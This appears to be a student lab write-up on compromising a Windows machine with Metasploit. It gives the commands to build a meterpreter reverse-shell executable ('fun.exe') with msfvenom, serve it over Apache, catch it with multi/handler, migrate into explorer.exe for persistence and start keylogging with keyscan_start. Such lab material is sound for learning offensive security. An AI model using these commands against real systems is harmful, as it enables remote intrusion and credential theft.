# Compromising-windows-using-Metasploit
Compromising windows using Metasploit
# Metasploit
Compromising windows using Metasploit

# AIM:

To Compromise windows using Metasploit .

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode

### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## EXECUTION STEPS AND ITS OUTPUT:
Find the attackers ip address using ifconfig
## OUTPUT :
![image](https://github.com/user-attachments/assets/2ea74fec-50ee-473a-81fd-bbff61774d1a)!
Create a malicious executable file fun.exe using msfvenom command
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe
## OUTPUT :
![image](https://github.com/user-attachments/assets/e262397b-e70d-4a16-ae22-0dd5bdf2a054)
copy the fun.exe into the apache /var/www/html folder sudo systemctl apache2 start
Check the status of apache2
## OUTPUT :
![image](https://github.com/user-attachments/assets/e0375077-ea3f-4614-aaa3-361682cd6a4b)
Invoke msfconsole:
## OUTPUT:
![image](https://github.com/user-attachments/assets/3d81981e-615b-4d34-9e8a-f655ca6fdf8a)
Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.
## OUTPUT :
![image](https://github.com/user-attachments/assets/af3bd8d9-f183-4502-8d52-3e176c0f0d13)
Starting a command and control Server use multi/handler set PAYLOAD windows/meterpreter/reverse_tcp set LHOST 0.0.0.0 exploit
## OUPUT :
![image](https://github.com/user-attachments/assets/6da0f739-e73c-4463-86a4-bbdeae46011f)
WINDOWS :
On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine: http://192.168.1.2/fun.exe The file "fun.exe" downloads
## BROWSE OUTPUT:
![image](https://github.com/user-attachments/assets/5f7708c7-614b-4511-bcac-332a847a80a6)
## DOWNLOAD OUTPUT:
![image](https://github.com/user-attachments/assets/a168e8b9-7642-4537-ae47-c3adf63c3395)
## COME BACK TO PARROT:
To see a list of processes, at the meterpreter > prompt, execute this command: ps ⇒ can see the fun.exe process running with pid 1156
## OUTPUT :
![image](https://github.com/user-attachments/assets/e3863cd5-b9d1-47e1-ab09-a11dbabeb04c)
The Metasploit shell is running inside the "fun.exe" process. If the user closes that process, or logs off, the connection will be lost. To become more persistent, we'll migrate to a process that will last longer. Let's migrate to the winlogon process. At the meterpreter > prompt, execute this command:

migrate -N explorer.exe at meterpreter > prompt, execute this command: netstat A list of network connections appears, including one to a remote port of 4444, as highlighted in the image below. Notice the "PID/Program name" value for this connection, which is redacted
## OUTPUT :
![image](https://github.com/user-attachments/assets/ad12d840-9977-4d27-8458-ee5a1a05e8bb)
## WINDOWS OUTPUT :
![image](https://github.com/user-attachments/assets/4957dc88-dd6d-4bcb-98f1-d94e4800464b)
Post Exploitation The target is now owned. Following are meterpreter commands for key capturing in the target machine keyscan_start Begins capturing keys typed in the target. On the Windows target, open Notepad and type in some text, such as your name.
## OUTPUT:
![image](https://github.com/user-attachments/assets/1cf72375-433f-4d4a-8141-226927af6592)
## RESULT:
The Metasploit framework is  used to compromise windows and is examined successfully.
